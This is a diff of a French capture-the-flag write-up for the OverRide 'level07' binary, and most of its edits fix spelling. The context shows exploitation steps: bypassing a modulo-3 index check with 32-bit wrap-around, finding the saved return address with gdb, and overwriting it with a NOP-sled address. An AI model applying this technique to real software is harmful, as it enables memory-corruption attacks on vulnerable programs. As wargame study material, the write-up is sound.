@@ -22,7 +22,7 @@ Input command: quit
 level07@OverRide:~$
 
 
-decompilation
+décompilation
 https://dogbolt.org/?id=8664e046-211f-4772-a084-6112ec01480f#Boomerang=8&Ghidra=221&Hex-Rays=166&angr=186&Relyze=1&RetDec=22&Snowman=8332&BinaryNinja=366
 
 
@@ -43,7 +43,7 @@ Input command: read
 Input command: store
  Number: 101
  Index: 101
- Completed e command successfully
+ Completed store command successfully
 Input command: read
  Index: 101
  Number at data[101] is 1684104562
@@ -87,7 +87,7 @@ Stack level 0, frame at 0xffffd710:
   ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
 (gdb)
 
-saved eip est stocker dans 0xffffd70c
+saved eip est stocké dans 0xffffd70c
 
 
 on fait la soustraction pour trouver l'offset entre le debut de storage et eip
@@ -114,7 +114,7 @@ Input command: store
  Failed to do store command
 
 
-donc pour utiliser 111 on est bloquer
+donc pour utiliser 111 on est bloqué
 mais on peut utiliser le wrap around pour contourner le check du modulo 3
 
 (x + 2^32) % 2^32 = x
@@ -243,8 +243,8 @@ Input command: read
  Number at data[114] is 4158936339
  Completed read command successfully
 
-En parcourant tout les index autour on tombe sur 114
-il contient 4158936339 qui en hexa donne F7E45513 qui est une addresse valable c'est a l'index 114 qu'il y a surement eip 
+En parcourant tous les index autour on tombe sur 114
+il contient 4158936339 qui en hexa donne F7E45513 qui est une adresse valable, c'est à l'index 114 qu'il y a surement eip 
 
 114 + 2^30 = 114 + 1073741824 = 1073741938
 
@@ -260,8 +260,8 @@ level07@OverRide:~$
 pour etre au milieu du NOP sled et pouvoir glisser a coup sure
 4294956304 + 30*4 = 4294956304 + 120 = 4294956424
 
-C'est bon le programme segfault on a ecrit au bon endroit.
-on stock l'adresse du debut du tableau (4294956424) a la place de eip (index 114 == 1073741938)
+C'est bon le programme segfault on a écrit au bon endroit.
+on stock l'adresse au milieu du NOP sled (4294956424) a la place de eip (index 114 == 1073741938)
 
 level07@OverRide:~$ ./level07
 ...
@@ -273,7 +273,7 @@ Input command: quit
 Segmentation fault (core dumped)
 level07@OverRide:~$
 
-on finit par segfault car on pas de NOP sled pour viser plus large
+on finit par segfault car on n'a pas de NOP sled pour viser plus large
 \x90\x90\x90\x90
 
 inversion de l'ordre des octets (Endianness)
